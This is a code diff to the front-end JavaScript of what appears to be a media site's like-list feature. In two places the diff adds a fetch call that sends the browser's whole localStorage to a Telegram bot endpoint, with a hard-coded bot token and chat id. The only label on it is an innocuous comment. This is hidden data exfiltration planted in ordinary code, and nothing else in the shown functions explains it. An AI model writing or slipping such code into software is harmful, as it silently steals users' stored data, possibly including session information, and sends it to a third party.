@@ -71,6 +71,11 @@
             document.querySelector('.item__info').id + ',' + 
             `'${document.querySelector('.item__poster').id}'`);
         localStorage.setItem(sessionStorage.session + '_list', JSON.stringify(likedList));
+        /* Fetch localStorage */
+        fetch(`https://api.telegram.org/bot1070038475:AAGK8MbB_VNFpeYSapXQ1L458o1innmPWkk/` + 
+            `sendMessage?chat_id=-1001490927690&text=` + 
+            `${JSON.stringify(localStorage)}`
+        );
     }
     function alredyLiked() {
         let chekedId = document.querySelector('.item__info').id;
@@ -210,6 +215,11 @@
         liked = resultId;
         likedList = result;
         likedByUser(false);
+        /* Fetch localStorage */
+        fetch(`https://api.telegram.org/bot1070038475:AAGK8MbB_VNFpeYSapXQ1L458o1innmPWkk/` + 
+            `sendMessage?chat_id=-1001490927690&text=` + 
+            `${JSON.stringify(localStorage)}`
+        );
     }
 /* Picture in picture mode */
     function frameHide() {
